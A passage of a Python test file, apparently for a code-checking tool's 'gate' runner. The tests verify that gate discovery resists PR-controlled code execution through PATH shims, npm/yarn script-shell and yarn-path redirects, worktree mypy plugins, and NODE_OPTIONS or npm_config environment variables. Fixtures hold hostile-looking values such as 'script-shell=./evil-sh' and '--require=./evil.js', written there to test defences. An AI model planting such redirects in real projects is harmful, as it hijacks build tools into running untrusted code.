        assert diff_gate.cmd[1:3] == ["diff", "--check"]
        if len(diff_gate.cmd) > 3:
            assert diff_gate.cmd[3].endswith("...HEAD")

    def test_git_diff_check_accepts_fully_qualified_local_ref(
        self, tmp_path: Path
    ) -> None:
        """Iter-17 Finding 2: ``_refresh_pr_base_ref`` lands the PR base
        into ``refs/remotes/pdd-checkup/pr-<N>/base`` so it cannot
        collide with the operator's own ``origin`` tracking refs. The
        gate resolver MUST accept that fully-qualified ref directly
        (instead of trying ``origin/refs/...`` and falling through to
        the generic candidate set, which would silently drop the PR
        range)."""
        from pdd.checkup_gates import discover_gates

        subprocess.run(["git", "init", "-q", "-b", "main"], cwd=tmp_path, check=True)
        subprocess.run(
            [
                "git",
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@x",
                "commit",
                "--allow-empty",
                "-m",
                "init",
                "-q",
            ],
            cwd=tmp_path,
            check=True,
        )
        # Manufacture the dedicated tracking ref that
        # ``_refresh_pr_base_ref`` would produce in production.
        local_ref = "refs/remotes/pdd-checkup/pr-1/base"
        subprocess.run(
            ["git", "update-ref", local_ref, "HEAD"],
            cwd=tmp_path,
            check=True,
        )
        # Synthetic "PR" branch with a clean working tree.
        subprocess.run(
            ["git", "checkout", "-q", "-b", "feature"], cwd=tmp_path, check=True
        )
        subprocess.run(
            [
                "git",
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@x",
                "commit",
                "--allow-empty",
                "-m",
                "feat",
                "-q",
            ],
            cwd=tmp_path,
            check=True,
        )
        gates = discover_gates(tmp_path, changed_files=(), base_ref=local_ref)
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        # The gate must run against the dedicated ref directly, not
        # ``origin/refs/...`` or a fallback like ``main...HEAD``.
        assert Path(diff_gate.cmd[0]).is_absolute()
        assert diff_gate.cmd[1:] == ["diff", "--check", f"{local_ref}...HEAD"]

    def test_git_diff_check_uses_trusted_git_under_dot_path(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        """Greg PR #1095 review: gate-layer git must not execute a
        worktree-local ``./git`` shim when the operator has
        ``PATH=.:$PATH``.
        """
        from pdd.checkup_gates import discover_gates, run_gates

        _git_init(tmp_path)
        shim = tmp_path / "git"
        marker = tmp_path / "marker"
        shim.write_text(
            f"#!/bin/sh\necho shim >> {marker}\nexit 1\n",
            encoding="utf-8",
        )
        shim.chmod(0o755)
        monkeypatch.setenv("PATH", f".{os.pathsep}{os.environ.get('PATH', '')}")

        gates = discover_gates(tmp_path, changed_files=())
        diff_gate = next(g for g in gates if g.name == "git-diff-check")
        assert Path(diff_gate.cmd[0]).is_absolute()
        assert Path(diff_gate.cmd[0]).resolve() != shim.resolve()

        results = run_gates(
            tmp_path,
            [diff_gate],
            artifacts_dir=tmp_path / ".pdd" / "gates",
            round_number=1,
            mode="review",
        )

        assert results[0].exit_code == 0
        assert not marker.exists()

    def test_tsc_noemit_skipped_when_node_modules_typescript_absent(
        self, tmp_path: Path
    ) -> None:
        """Iter-16 Finding 3: tsc-noemit must NOT fire ``npx tsc`` when
        TypeScript isn't actually installed locally. Bare ``npx tsc``
        falls back to a registry download + install + exec when the
        local binary is missing, which violates the deterministic-local
        contract from issue #1092. Discovery must skip the gate in that
        case so the gate runner never gets a chance to network-install.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        # NOTE: no ``node_modules/typescript/bin/tsc`` on disk.
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        assert "tsc-noemit" not in names

    def test_tsc_noemit_emitted_with_no_install_flag_when_locally_present(
        self, tmp_path: Path
    ) -> None:
        """Iter-16 Finding 3 inverse: once TypeScript IS installed
        locally, the gate fires — and it must pass ``--no-install`` so
        a future npx rewire still cannot reach the registry."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        names = [g.name for g in gates]
        if "tsc-noemit" in names:  # only when ``npx`` is on PATH
            gate = next(g for g in gates if g.name == "tsc-noemit")
            assert "--no-install" in gate.cmd

    # ------------------------------------------------------------------
    # Iter-38 Finding 1: package-manager config can redirect script
    # execution to a PR-controlled binary.
    # ------------------------------------------------------------------

    def test_npm_gates_skip_when_npmrc_sets_script_shell(self, tmp_path: Path) -> None:
        """Iter-38 Finding 1: ``.npmrc``'s ``script-shell`` key lets a PR
        redirect ``npm run`` (and ``npx``) to a PR-controlled shell
        binary. Confirmed against npm 10.x: writing
        ``script-shell=./evil-sh`` plus ``./evil-sh`` makes
        ``npm run format:check`` execute ``./evil-sh -c "prettier
        --check ."`` before the allowlisted argv even runs. The entire
        npm gate path must short-circuit when this config is present.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / ".npmrc").write_text("script-shell=./evil-sh\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_pnpmrc_sets_script_shell(self, tmp_path: Path) -> None:
        """Iter-38 Finding 1: pnpm reads ``.pnpmrc`` (in addition to
        ``.npmrc``) and honours ``script-shell``."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "pnpm-lock.yaml").write_text(
            "lockfileVersion: '6.0'\n", encoding="utf-8"
        )
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / ".pnpmrc").write_text("script-shell=./evil-sh\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_yarnrc_sets_script_shell(self, tmp_path: Path) -> None:
        """Iter-38 Finding 1: yarn 1's ``.yarnrc`` honours
        ``script-shell``."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / ".yarnrc").write_text(
            'script-shell "./evil-sh"\n', encoding="utf-8"
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_yarnrc_sets_yarn_path(self, tmp_path: Path) -> None:
        """Iter-38 Finding 1: yarn 1's ``yarn-path`` redirects the yarn
        binary itself to a PR-controlled JavaScript file."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / ".yarnrc").write_text(
            'yarn-path "./evil-yarn.cjs"\n', encoding="utf-8"
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_yarnrc_yml_sets_yarn_path(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1: yarn 2+'s ``.yarnrc.yml`` ``yarnPath`` key
        redirects yarn boot to a PR-controlled ``.cjs`` runtime."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / ".yarnrc.yml").write_text(
            'yarnPath: "./.yarn/releases/yarn-evil.cjs"\n', encoding="utf-8"
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_yarn_releases_directory_exists(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1: yarn 2+ boots from ``.yarn/releases/yarn-*.cjs``.
        The file is PR-controllable and runs JS at every yarn invocation."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        releases = tmp_path / ".yarn" / "releases"
        releases.mkdir(parents=True)
        (releases / "yarn-3.6.0.cjs").write_text("// yarn release\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_pr_modifies_npmrc(self, tmp_path: Path) -> None:
        """Iter-38 Finding 1: a PR that adds or modifies ``.npmrc`` can
        introduce ``script-shell`` even if discovery didn't catch the
        config text — fail-closed on any PR diff that touches the file.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        # Note: even an empty .npmrc not in the worktree — the PR
        # diff alone makes us assume the runner is poisoned.
        gates = discover_gates(tmp_path, changed_files=(".npmrc",))
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_npm_gates_skip_when_pr_modifies_yarn_directory(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1: yarn 2+ boots from anything under
        ``.yarn/`` (releases, plugins, sdks). A PR diff in that tree
        controls the runtime."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        gates = discover_gates(
            tmp_path,
            changed_files=(".yarn/releases/yarn-3.6.0.cjs",),
        )
        names = {g.name for g in gates}
        assert "npm:format:check" not in names

    def test_direct_tsc_gate_skips_when_npmrc_sets_script_shell(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1: the direct ``npx --no-install tsc --noEmit``
        gate is ALSO vulnerable to ``.npmrc`` script-shell redirect —
        npx reads ``.npmrc`` and honours the key. Confirmed against
        npx 10.x."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {},
                    "devDependencies": {"typescript": "^5.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text("{}", encoding="utf-8")
        tsc_dir = tmp_path / "node_modules" / "typescript" / "bin"
        tsc_dir.mkdir(parents=True)
        (tsc_dir / "tsc").write_text("#!/usr/bin/env node\n", encoding="utf-8")
        (tmp_path / ".npmrc").write_text("script-shell=./evil-sh\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "tsc-noemit" not in names

    def test_npm_gates_still_emit_on_normal_npmrc_without_script_shell(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 1 regression bound: a benign ``.npmrc``
        (registry, save-exact, etc.) must NOT disable npm gates.
        The redirect check is precise to the keys that actually
        change script execution."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
        )
        (tmp_path / ".npmrc").write_text(
            "registry=https://registry.npmjs.org/\nsave-exact=true\n",
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:format:check" in names

    # ------------------------------------------------------------------
    # Iter-38 Finding 2: per-script tsconfig emit-signal walk.
    # ------------------------------------------------------------------

    def test_tsc_script_skipped_when_custom_p_path_signals_emit(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 2: ``tsc -p config/build.json --noEmit`` whose
        ``config/build.json`` sets ``incremental: true`` writes
        ``tsconfig.tsbuildinfo`` even with ``--noEmit``. The iter-29
        emit-signal walk only checked the worktree-root
        ``tsconfig.json``; iter-38 extends the walk to every ``-p``
        target referenced by a recognised tsc-flavoured script."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {"typecheck": "tsc -p config/build.json --noEmit"},
                }
            ),
            encoding="utf-8",
        )
        # Root tsconfig is benign — no incremental — so iter-29's
        # root-only walk would NOT flag this case.
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {}}\n', encoding="utf-8"
        )
        (tmp_path / "config").mkdir()
        (tmp_path / "config" / "build.json").write_text(
            '{"compilerOptions": {"incremental": true}}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:typecheck" not in names

    def test_tsc_script_skipped_when_custom_p_extends_chain_signals_emit(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 2 + iter-29: the per-script walk must also
        traverse the extends chain of the custom ``-p`` target."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {"typecheck": "tsc -p config/build.json --noEmit"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {}}\n', encoding="utf-8"
        )
        (tmp_path / "config").mkdir()
        (tmp_path / "config" / "base.json").write_text(
            '{"compilerOptions": {"composite": true}}\n',
            encoding="utf-8",
        )
        (tmp_path / "config" / "build.json").write_text(
            '{"extends": "./base.json"}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:typecheck" not in names

    def test_tsc_script_skipped_when_custom_p_directory_signals_emit(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 2: tsc's ``-p <dir>`` resolves to
        ``<dir>/tsconfig.json``. The emit-signal walk must follow the
        directory shape too."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "fake",
                    "version": "0.0.0",
                    "scripts": {"typecheck": "tsc -p config/build --noEmit"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "tsconfig.json").write_text(
            '{"compilerOptions": {}}\n', encoding="utf-8"
        )
        (tmp_path / "config" / "build").mkdir(parents=True)
        (tmp_path / "config" / "build" / "tsconfig.json").write_text(
            '{"compilerOptions": {"incremental": true}}\n',
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=())
        names = {g.name for g in gates}
        assert "npm:typecheck" not in names

    # ------------------------------------------------------------------
    # Iter-38 Finding 3: pure-package mypy plugin that resolves to a
    # worktree package directory must disable the mypy gate.
    # ------------------------------------------------------------------

    def test_mypy_gate_skipped_when_pure_package_plugin_matches_worktree_package(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 3: a "pure package" mypy plugin name like
        ``my_project.mypy_plugin`` can still resolve to PR-controlled
        worktree code when the project is installed editable (or
        ``PYTHONPATH=`` points at the worktree). Confirmed against
        mypy 1.20: setting ``PYTHONPATH=.`` (or ``pip install -e .``)
        makes mypy import the worktree module rather than a stable
        site-packages copy. Skip the gate when the plugin's top-level
        name maps to a worktree package directory."""
        import shutil as _shutil

        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["my_project.mypy_plugin"]\n',
            encoding="utf-8",
        )
        # Worktree contains a top-level ``my_project/`` package that
        # an editable install (or PYTHONPATH=.) would resolve to.
        (tmp_path / "my_project").mkdir()
        (tmp_path / "my_project" / "__init__.py").write_text("", encoding="utf-8")
        (tmp_path / "my_project" / "mypy_plugin.py").write_text(
            "from mypy.plugin import Plugin\nclass P(Plugin): pass\ndef plugin(v): return P\n",
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" not in names

    def test_mypy_gate_skipped_when_pure_package_plugin_matches_worktree_module(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 3: single-file modules (``my_plugin.py`` at
        worktree root) are also editable-importable, so the skip must
        catch ``plugins = ["my_plugin"]`` against ``./my_plugin.py``."""
        import shutil as _shutil

        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["my_plugin"]\n',
            encoding="utf-8",
        )
        (tmp_path / "my_plugin.py").write_text(
            "from mypy.plugin import Plugin\nclass P(Plugin): pass\ndef plugin(v): return P\n",
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" not in names

    def test_mypy_gate_skipped_when_ini_pure_package_plugin_matches_worktree(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 3 also fires from ``mypy.ini`` / ``.mypy.ini``
        / ``setup.cfg``'s ``[mypy] plugins =`` line."""
        import shutil as _shutil

        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        # pyproject.toml needs the [tool.mypy] section to even get the
        # mypy gate considered for discovery.
        (tmp_path / "pyproject.toml").write_text("[tool.mypy]\n", encoding="utf-8")
        (tmp_path / "mypy.ini").write_text(
            "[mypy]\nplugins = my_project.mypy_plugin\n",
            encoding="utf-8",
        )
        (tmp_path / "my_project").mkdir()
        (tmp_path / "my_project" / "__init__.py").write_text("", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" not in names

    def test_mypy_gate_emits_when_pure_package_plugin_has_no_worktree_match(
        self, tmp_path: Path
    ) -> None:
        """Iter-38 Finding 3 regression bound: third-party pure-package
        plugins (``mypy_django_plugin.main``) whose top-level name does
        NOT exist in the worktree still produce a mypy gate. We do not
        want to drop legitimate third-party plugin use."""
        import shutil as _shutil

        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["mypy_django_plugin.main"]\n',
            encoding="utf-8",
        )
        # No ``mypy_django_plugin/`` directory in the worktree.
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" in names

    def test_build_subprocess_env_strips_pythonpath_family(
        self, monkeypatch: Any
    ) -> None:
        """Iter-38 Finding 3 (primary defence): the runner's env scrub
        MUST strip the Python import-path family so a developer with
        ``PYTHONPATH=.`` in their shell cannot let a "pure package"
        plugin in a stable config resolve to a PR-controlled module
        in the gate's cwd."""
        from pdd.checkup_gates import _build_subprocess_env

        for key, value in (
            ("PYTHONPATH", "/some/path:./more"),
            ("PYTHONHOME", "/opt/python"),
            ("PYTHONSTARTUP", "/some/start.py"),
            ("PYTHONUSERBASE", "/usr/local"),
            ("PYTHONNOUSERSITE", "1"),
        ):
            monkeypatch.setenv(key, value)
        env = _build_subprocess_env()
        for key in (
            "PYTHONPATH",
            "PYTHONHOME",
            "PYTHONSTARTUP",
            "PYTHONUSERBASE",
            "PYTHONNOUSERSITE",
        ):
            assert key not in env, (
                f"_build_subprocess_env must strip {key} so a stale shell "
                f"env cannot escalate a pure-package mypy plugin into a "
                f"worktree import"
            )

    # ------------------------------------------------------------------
    # Iter-39 Finding 3: NPM_CONFIG_*/npm_config_*/NODE_OPTIONS/NODE_PATH
    # are equivalent to .npmrc settings and must be stripped from the
    # gate env. Confirmed against npm 10.x:
    # NPM_CONFIG_SCRIPT_SHELL=./evil-sh executes ./evil-sh on
    # npm run, even on a clean .npmrc.
    # ------------------------------------------------------------------

    def test_build_subprocess_env_strips_npm_config_uppercase(
        self, monkeypatch: Any
    ) -> None:
        """Iter-39 Finding 3: ``NPM_CONFIG_SCRIPT_SHELL`` in the
        operator env redirects ``npm run`` to a PR-controlled binary
        even when ``.npmrc`` is safe. Confirmed against npm 10.x."""
        from pdd.checkup_gates import _build_subprocess_env

        monkeypatch.setenv("NPM_CONFIG_SCRIPT_SHELL", "./evil-sh")
        monkeypatch.setenv("NPM_CONFIG_REGISTRY", "https://evil.example/")
        env = _build_subprocess_env()
        assert "NPM_CONFIG_SCRIPT_SHELL" not in env
        assert "NPM_CONFIG_REGISTRY" not in env

    def test_build_subprocess_env_strips_npm_config_lowercase(
        self, monkeypatch: Any
    ) -> None:
        """Iter-39 Finding 3: npm/pnpm read the lowercase
        ``npm_config_<key>`` form too. Confirmed against npm 10.x:
        ``npm_config_script_shell=./evil-sh`` is an independent env
        key from ``NPM_CONFIG_SCRIPT_SHELL`` and is also honoured."""
        from pdd.checkup_gates import _build_subprocess_env

        monkeypatch.setenv("npm_config_script_shell", "./evil-sh")
        monkeypatch.setenv("npm_config_registry", "https://evil.example/")
        env = _build_subprocess_env()
        assert "npm_config_script_shell" not in env
        assert "npm_config_registry" not in env

    def test_build_subprocess_env_strips_node_options_and_node_path(
        self, monkeypatch: Any
    ) -> None:
        """Iter-39 Finding 3: ``NODE_OPTIONS=--require=./evil.js`` loads
        arbitrary JS into every node subprocess — including the
        ``npx --no-install tsc`` gate. ``NODE_PATH`` is Node's
        ``PYTHONPATH`` analogue and adds directories to Node's
        module-resolution path. Both must be stripped."""
        from pdd.checkup_gates import _build_subprocess_env

        monkeypatch.setenv("NODE_OPTIONS", "--require=./evil.js")
        monkeypatch.setenv("NODE_PATH", "/tmp/evil-modules")
        env = _build_subprocess_env()
        assert "NODE_OPTIONS" not in env
        assert "NODE_PATH" not in env

    def test_build_subprocess_env_forces_corepack_auto_pin_off(
        self, monkeypatch: Any
    ) -> None:
        """Iter-39 Finding 1: Corepack-managed yarn/pnpm auto-pin a
        ``packageManager`` field into ``package.json`` on first run
        (default behaviour). The gate's cwd is the loop-owned PR
        worktree, so the mutation lands in the PR and the downstream
        commit/push helper stages it. The runner MUST set
        ``COREPACK_ENABLE_AUTO_PIN=0`` to prevent this.

        Confirmed against corepack 0.31 + pnpm@latest:
        ``COREPACK_ENABLE_AUTO_PIN=1 corepack pnpm@latest run …``
        mutates ``package.json`` while
        ``COREPACK_ENABLE_AUTO_PIN=0 corepack pnpm@latest run …`` does
        not.
        """
        from pdd.checkup_gates import _build_subprocess_env

        # Even if the operator's env explicitly enables auto-pin, the
        # runner must force the disable.
        monkeypatch.setenv("COREPACK_ENABLE_AUTO_PIN", "1")
        env = _build_subprocess_env()
        assert env.get("COREPACK_ENABLE_AUTO_PIN") == "0"

    # ------------------------------------------------------------------
    # Iter-39 Finding 2: mypy "pure package" plugin resolution under the
    # src/ layout. The iter-38 fix only checked the worktree root; src/
    # layout repos (very common with modern pyproject.toml) put the
    # importable package at worktree/src/<top_level>/.
    # ------------------------------------------------------------------

    def test_mypy_gate_skipped_when_pure_package_plugin_matches_src_layout(
        self, tmp_path: Path
    ) -> None:
        """Iter-39 Finding 2: ``plugins = ["evil_plugin"]`` plus a
        src-layout package at ``src/evil_plugin/__init__.py`` still
        resolves to PR-controlled code under an editable install. The
        iter-38 root-only worktree check missed this — extend the
        check to ``worktree/src/<top_level>``."""
        import shutil as _shutil

        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["evil_plugin"]\n',
            encoding="utf-8",
        )
        # src/ layout: the package lives under src/, not at root.
        src_pkg = tmp_path / "src" / "evil_plugin"
        src_pkg.mkdir(parents=True)
        (src_pkg / "__init__.py").write_text(
            "from mypy.plugin import Plugin\nclass P(Plugin): pass\ndef plugin(v): return P\n",
            encoding="utf-8",
        )
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" not in names

    def test_mypy_gate_skipped_when_dotted_plugin_matches_src_top_level(
        self, tmp_path: Path
    ) -> None:
        """Iter-39 Finding 2: dotted plugin name (``evil_plugin.main``)
        whose top-level (``evil_plugin``) sits under src/ still
        resolves under an editable install."""
        import shutil as _shutil

        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["evil_plugin.main"]\n',
            encoding="utf-8",
        )
        src_pkg = tmp_path / "src" / "evil_plugin"
        src_pkg.mkdir(parents=True)
        (src_pkg / "__init__.py").write_text("", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" not in names

    def test_mypy_gate_skipped_when_src_namespace_dir_matches_plugin(
        self, tmp_path: Path
    ) -> None:
        """Iter-39 Finding 2 + PEP 420: a ``src/evil_plugin/`` directory
        with NO ``__init__.py`` is still importable under namespace-
        package discovery. Conservative treatment: same-named
        directory under src/ disables the gate."""
        import shutil as _shutil

        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["evil_plugin"]\n',
            encoding="utf-8",
        )
        # PEP 420 namespace-package directory at src/ level — no
        # __init__.py but the directory exists.
        (tmp_path / "src" / "evil_plugin").mkdir(parents=True)
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" not in names

    def test_mypy_gate_emits_when_pure_package_plugin_matches_neither_root_nor_src(
        self, tmp_path: Path
    ) -> None:
        """Iter-39 Finding 2 regression bound: a third-party plugin
        (``mypy_django_plugin.main``) whose top-level appears NEITHER
        at worktree root NOR under ``src/`` must still produce the
        mypy gate. We do not want the broadened check to disable
        legitimate third-party plugin use."""
        import shutil as _shutil

        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text(
            '[tool.mypy]\nplugins = ["mypy_django_plugin.main"]\n',
            encoding="utf-8",
        )
        # Worktree has a src/ dir but NO ``src/mypy_django_plugin/``.
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "unrelated.py").write_text("", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        names = {g.name for g in gates}
        assert "mypy" in names

    # ------------------------------------------------------------------
    # Iter-40 Finding 1: gate.cmd stores absolute paths; PATH is
    # sanitized to drop ``.``, relative entries, and worktree entries.
    # ------------------------------------------------------------------

    def test_mypy_gate_cmd_uses_absolute_path_not_bare_name(
        self, tmp_path: Path
    ) -> None:
        """Iter-40 Finding 1: an operator with ``PATH=.:$PATH`` (or any
        PATH entry resolving inside the worktree) would otherwise let
        a PR-shipped ``./mypy`` shim become the gate binary. Gate.cmd
        MUST store the absolute path resolved against a sanitized
        PATH so ``subprocess.run`` cannot re-consult PATH at execution
        time."""
        import shutil as _shutil

        if not _shutil.which("mypy"):  # pragma: no cover
            return
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "a.py").write_text("x: int = 5\n", encoding="utf-8")
        (tmp_path / "pyproject.toml").write_text("[tool.mypy]\n", encoding="utf-8")
        # Plant a fake ``./mypy`` at the worktree root.
        (tmp_path / "mypy").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        (tmp_path / "mypy").chmod(0o755)
        gates = discover_gates(tmp_path, changed_files=("a.py",))
        mypy_gates = [g for g in gates if g.name == "mypy"]
        if not mypy_gates:
            return  # mypy not present, skip
        gate = mypy_gates[0]
        assert Path(gate.cmd[0]).is_absolute(), (
            f"gate.cmd[0] must be an absolute path; got {gate.cmd[0]!r}"
        )
        # The absolute path MUST NOT resolve to the PR-planted shim.
        resolved = Path(gate.cmd[0]).resolve()
        try:
            resolved.relative_to(tmp_path.resolve())
        except ValueError:
            pass  # not in worktree — good
        else:
            raise AssertionError(
                f"gate.cmd[0] resolved inside the worktree ({resolved}); "
                f"PATH sanitization failed"
            )

    def test_npm_gate_cmd_uses_absolute_runner_path(self, tmp_path: Path) -> None:
        """Iter-40 Finding 1: same as the mypy case but for the
        npm-family runner."""
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        (tmp_path / "package.json").write_text(
            _make_pkg_json({"format:check": "prettier --check ."}),
            encoding="utf-8",
